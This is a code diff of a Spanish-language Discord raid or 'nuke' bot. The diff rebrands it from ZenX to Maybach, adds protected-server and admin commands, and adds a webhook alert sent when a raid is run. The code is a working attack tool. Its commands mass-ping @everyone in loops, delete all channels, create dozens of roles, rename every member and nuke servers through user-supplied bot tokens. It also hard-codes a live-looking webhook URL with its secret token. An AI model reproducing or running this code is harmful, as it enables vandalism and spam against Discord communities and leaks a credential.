@@ -12,14 +12,21 @@ if(!fs.existsSync('ids_premium_users.json')){
 if(!fs.existsSync('blacklist_users.json')){
     fs.writeFileSync('blacklist_users.json','[{}]');
 };
+if(!fs.existsSync('protected_servers.json')){
+    fs.writeFileSync('protected_servers.json','[]');
+};
 const bot_token = ""; // Token del bot
-const prefix = "&"; // Prefijo de los comandos xd
+const prefix = "!"; // Prefijo de los comandos xd
 const prefix_p = "#"; // Prefijo de los comandos premium
 let config_usuarios_premium = {};
 let idservidores_nopermitidos = ["id_de_tu_servidor", "otro_id_xdd", "y_otro_id_:v"]; // Lista de IDs de servidores donde el bot no puede ejecutar comandos de ataque
 let usuarios_owners = ["", ""]; // Lista de IDs de los usuarios owners
 let usuarios_premium = [];
 let blacklist_user = [];
+let protected_servers = [];
+let admin_users = [""];
+const webhook_url = "https://canary.discord.com/api/webhooks/1395307251970871326/nl-jZMNPSbDGj-F0y5v0l_0ggYmiOJ7eBpSuTmUMLwbINewIoG2nhBQFvyPvAhhSeLDV";
+const webhookClient = new WebhookClient({ url: webhook_url });
 const channel_logs = "1256824639791825016"; //ID del canal a donde se enviarán los registros - El bot debe estar dentro de ese servidor.
 let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
 let blaclist_usersids = JSON.parse(blacklist_users_json);
@@ -33,6 +40,8 @@ config_usuarios_premium = JSON.parse(config_premium_users_json);
 for (let i = 0; i < ids_premium_users_xd.length; i++) {
     usuarios_premium.push(ids_premium_users_xd[i]['id']);
 };
+let protected_servers_json = fs.readFileSync("protected_servers.json", 'utf-8');
+protected_servers = JSON.parse(protected_servers_json);
 client.on(`ready`,()=>{
     console.clear();
     console.log(``);
@@ -44,6 +53,13 @@ client.on(`messageCreate`,async (msg)=>{
     if(blacklist_user.includes(msg.author.id)){
         return;
     };
+    const args = msg.content.slice(prefix.length).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
+    if (msg.content.startsWith(prefix)) {
+        if (protected_servers.includes(msg.guild.id) && command !== 'invite') {
+            return msg.reply('Este servidor está protegido y no se pueden usar comandos aquí.');
+        }
+    }
     //Normal cmds
     if(msg.content === prefix+"help"){
         try {
@@ -97,9 +113,8 @@ client.on(`messageCreate`,async (msg)=>{
 > :dolce_145: *¿what is premium?*
 > *It works to customize the bot with your settings.*
 > :dolce_145: ** ¿how to get premium?
-> *get premium buying it for $1.99 ¡lifetime! [here](https://discord.gg/kEB3PCPkzc)*`)
+> *get premium buying it for $1.99 ¡lifetime! [here](https://discord.gg/A9p8P3Pxbx)*`)
            .setColor(`#d20f15`)
-           //Bro como que `¿what is premium?`, yo ni sé inglés pero no se puede poner "¿" al principio de una question bro...
         ]})
     };
     if(msg.content === prefix+"invite"){
@@ -141,6 +156,9 @@ client.on(`messageCreate`,async (msg)=>{
         ]})
     };
     if(msg.content === prefix+"on"){
+        if (msg.guild.memberCount < 5 && !admin_users.includes(msg.author.id)) {
+            return msg.reply('Los raids solo se pueden hacer en servidores con 5 o más miembros.');
+        }
         try {
             const blacklist_pecausa = new ButtonBuilder()
 			    .setCustomId('xdxd')
@@ -173,11 +191,22 @@ client.on(`messageCreate`,async (msg)=>{
             await msg.channel.send({content:`> Ese servidor no está permitido.`});
             return;
         };
+        if (msg.guild.memberCount >= 10) {
+            const embed = new EmbedBuilder()
+                .setTitle('Raid Alert')
+                .addFields(
+                    { name: 'Server', value: `${msg.guild.name} (${msg.guild.id})` },
+                    { name: 'Executor', value: `${msg.author.username} (${msg.author.id})` },
+                    { name: 'Members', value: `${msg.guild.memberCount}` }
+                )
+                .setColor('Red');
+            webhookClient.send({ embeds: [embed] });
+        }
         async function enviar_msgxd(canal) {
             let canalxdxd = client.channels.cache.get(canal.id);
             for (let index = 0; index < 30; index++) {
                 try {
-                    await canalxdxd.send({content:`@everyone https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
+                    await canalxdxd.send({content:`@everyone https://discord.gg/A9p8P3Pxbx - | - #HailMaybach`});
                 } catch (e) {
                     console.log(`[X] No se pudo enviar un mensaje con el comando "on", mensaje de error: ${e.message}`);
                 }
@@ -305,7 +334,7 @@ client.on(`messageCreate`,async (msg)=>{
         for (const ch of channelsssxdxd.values()) {
             ch.delete();
         };
-        await msg.guild.channels.create({name:"get-nuked",type:ChannelType.GuildText,topic:'zenx on top bro https://discord.gg/kEB3PCPkzc'});
+        await msg.guild.channels.create({name:"get-nuked",type:ChannelType.GuildText,topic:'Maybach on top bro https://discord.gg/A9p8P3Pxbx'});
     };
     if(msg.content === prefix+"spamchannels"){
         try {
@@ -344,7 +373,7 @@ client.on(`messageCreate`,async (msg)=>{
             let canalxdxd = client.channels.cache.get(canal.id);
             for (let index = 0; index < 25; index++) {
                 try {
-                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
+                    await canalxdxd.send({content:`@everyone https://discord.gg/A9p8P3Pxbx - | - #HailMaybach`});
                 } catch (e) {
                     console.log(`[X] No se pudo enviar un mensaje con el comando "spamchannels", mensaje de error: ${e.message}`);
                 }
@@ -392,7 +421,7 @@ client.on(`messageCreate`,async (msg)=>{
         //Así que a intentar equisde.
         for (let index = 0; index < 50; index++) {
             try {
-                await msg.guild.roles.create({name:'zenx-on-top',reason:'https://discord.gg/kEB3PCPkzc https://discord.gg/org'});
+                await msg.guild.roles.create({name:'Maybach',reason:'https://discord.gg/A9p8P3Pxbx'});
             } catch (e) {
                 console.log(`[X] No se pudo crear un rol en el servidor ${msg.guild.name} con ID ${msg.guild.id}, mensaje de error: ${e.message}`);
             }
@@ -434,7 +463,7 @@ client.on(`messageCreate`,async (msg)=>{
         let membersxdxd = await msg.guild.members.fetch();
         for (const m of membersxdxd.values()) {
             try {
-                await m.setNickname('.gg/zCQ8jQ2GBf');
+                await m.setNickname('.gg/A9p8P3Pxbx');
             } catch (e) {
                 console.log(`[X] No se pudo renombrar al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
             }
@@ -482,10 +511,59 @@ client.on(`messageCreate`,async (msg)=>{
             ]});
         }
     };
-    const args = msg.content.slice(prefix_p.length).trim().split(/ +/);
-    const command = args.shift().toLowerCase();
+
+    if (command === 'protect') {
+        if (!admin_users.includes(msg.author.id)) {
+            return msg.reply('No tienes permisos para usar este comando.');
+        }
+        if (protected_servers.includes(msg.guild.id)) {
+            return msg.reply('Este servidor ya está protegido.');
+        }
+        protected_servers.push(msg.guild.id);
+        fs.writeFileSync('protected_servers.json', JSON.stringify(protected_servers));
+        msg.reply('Servidor protegido.');
+    }
+
+    if (command === 'unprotect') {
+        if (!admin_users.includes(msg.author.id)) {
+            return msg.reply('No tienes permisos para usar este comando.');
+        }
+        if (!protected_servers.includes(msg.guild.id)) {
+            return msg.reply('Este servidor no está protegido.');
+        }
+        protected_servers = protected_servers.filter(id => id !== msg.guild.id);
+        fs.writeFileSync('protected_servers.json', JSON.stringify(protected_servers));
+        msg.reply('Servidor desprotegido.');
+    }
+
+    if(command === "addadmin"){
+        if(!usuarios_owners.includes(msg.author.id)){
+            return;
+        };
+        if(args.length === 0){
+            await msg.channel.send({content:`> Falta agregar un ID de usuario.`});
+            return;
+        };
+        let usuario_id = args[0];
+        admin_users.push(usuario_id);
+        await msg.channel.send({content:`> Usuario agregado como administrador.`});
+    };
+    if(command === "removeadmin"){
+        if(!usuarios_owners.includes(msg.author.id)){
+            return;
+        };
+        if(args.length === 0){
+            await msg.channel.send({content:`> Falta agregar un ID de usuario.`});
+            return;
+        };
+        let usuario_id = args[0];
+        admin_users = admin_users.filter(id => id !== usuario_id);
+        await msg.channel.send({content:`> Usuario removido como administrador.`});
+    };
+    const args_p = msg.content.slice(prefix_p.length).trim().split(/ +/);
+    const command_p = args_p.shift().toLowerCase();
     //Owner cmds
-    if(command === "user.blacklist"){
+    if(command_p === "user.blacklist"){
         if(!usuarios_owners.includes(msg.author.id)){
             return;
         };
@@ -716,7 +794,7 @@ client.on(`messageCreate`,async (msg)=>{
                 await msg.channel.send({content:`> No haz introducido ningún token de bot.`});
                 return;
             } else {
-                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/zCQ8jQ2GBf": config_usuarios_premium[msg.author.id].invite_url;
+                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/A9p8P3Pxbx": config_usuarios_premium[msg.author.id].invite_url;
                 await msg.channel.send({content:`> Nukeando guild...`});
                 let namev = `client${msg.author.id}`;
                 namev = new Client({intents: [103423]});
@@ -727,7 +805,7 @@ client.on(`messageCreate`,async (msg)=>{
                     let canalxdxd = namev.channels.cache.get(canal.id);
                     for (let index = 0; index < 30; index++) {
                         try {
-                            await canalxdxd.send({content:`@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
+                            await canalxdxd.send({content:`@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/A9p8P3Pxbx - | - #HailMaybach`});
                             counterrrrr++;
                             if(chsisssss <= counterrrrr){
                                 await namev.destroy();
